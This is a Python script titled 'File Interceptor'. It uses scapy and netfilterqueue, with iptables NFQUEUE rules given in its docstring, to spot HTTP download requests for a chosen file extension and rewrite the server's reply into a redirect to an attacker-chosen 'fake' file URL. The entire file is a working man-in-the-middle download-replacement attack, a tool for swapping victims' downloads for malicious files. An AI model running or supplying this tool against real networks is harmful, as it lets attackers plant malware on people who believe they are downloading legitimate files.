#!/usr/bin/env python
# coding=utf-8
"""
Title:    File Interceptor
Author:   Aniket Ambore
Date:     June 29, 2021
Comment:  File Interceptor - Replace Download Requests.

scapy Docs => https://scapy.readthedocs.io/en/latest/introduction.html
Through scapy module we can create different network tools like ARP Spoofer, Network Scanner, packet dumpers etc. This module can be used to create more advanced tools related to network security and ethical hacking.
netfilterqueue Docs => https://pypi.org/project/NetfilterQueue/
argparse Docs => https://docs.python.org/3/library/argparse.html#module-argparse

Before Running :-
sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0
sudo iptables -I INPUT -j NFQUEUE --queue-num 0
"""

import netfilterqueue
import scapy.all as scapy
import argparse
import sys
import time

FAIL = '\033[91m'
OKGREEN = '\033[92m'
OKCYAN = '\033[96m'
ORANGE = '\033[93m'
PURPLE = '\033[95m'

# using ack and seq packets are associated with each other
ack_list = []

file_extension = ""
fake_file_url = ""
queue_num = ""


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-fe", "--extension", dest="file_extension",
                        help="Extension of the file that you want to intercept.")
    parser.add_argument("-fu", "--url", dest="fake_file_url",
                        help="Fake URL of the file, to intercept the original file.")
    parser.add_argument("-qm", "--queuenum", dest="queue_num", help="Queue Num that, you set with the help of iptables")
    options = parser.parse_args()
    if not options.file_extension:
        parser.error(FAIL + "[-] Please specify the extension of the file to intercept, use --help for more info.")
    elif not options.fake_file_url:
        parser.error(
            FAIL + "[-] Please specify the fake URL of the file that you want to intercept with the original file, "
                   "use --help for more info.")
    elif not options.queue_num:
        parser.error(
            FAIL + "[-] Please specify Queue Num that, you set with the help of iptables, use --help for more info.")
    return options


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        # HTTP Port == 80 If DestinationPort in the TCP layer is set to 80, this means that packet is leaving from
        # our computer. It is an HTTP Request.
        if scapy_packet[scapy.TCP].dport == 80:
            print(OKCYAN + "[+] " + ORANGE + "HTTP Request")
            if "." + file_extension in scapy_packet[scapy.Raw].load:
                print(OKCYAN + "[+] " + OKGREEN + file_extension + " Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        # If SourcePort in the TCP layer is set to 80, this means that packet is coming to our computer. It is an
        # HTTP Response.
        elif scapy_packet[scapy.TCP].sport == 80:
            print(OKCYAN + "[+] " + ORANGE + "HTTP Response")
            if scapy_packet[scapy.TCP].seq in ack_list:
                print(
                            OKCYAN + "[+] " + ORANGE + "Replacing File >> ." + OKGREEN + file_extension + ORANGE + " with " + OKGREEN + fake_file_url)
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                modified_packet = set_load(scapy_packet,
                                           "HTTP/1.1 301 Moved Permanently\nLocation: " + fake_file_url + "\n\n")

                packet.set_payload(str(modified_packet))
    packet.accept()


def slowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0. / 100)


def script_header():
    slowprint('''\033[1;31m \033[96m
╔═╗┬┬  ┌─┐  ╦┌┐┌┌┬┐┌─┐┬─┐┌─┐┌─┐┌─┐┌┬┐┌─┐┬─┐
╠╣ ││  ├┤   ║│││ │ ├┤ ├┬┘│  ├┤ ├─┘ │ │ │├┬┘
╚  ┴┴─┘└─┘  ╩┘└┘ ┴ └─┘┴└─└─┘└─┘┴   ┴ └─┘┴└─
    ''')


options = get_arguments()
script_header()
file_extension = options.file_extension
fake_file_url = options.fake_file_url
queue_num = options.queue_num


nfqueue = netfilterqueue.NetfilterQueue()
nfqueue.bind(int(queue_num), process_packet)
try:
    nfqueue.run()
except KeyboardInterrupt:
    print(FAIL + "\n[!] Caught KeyboardInterrupt Exception.")
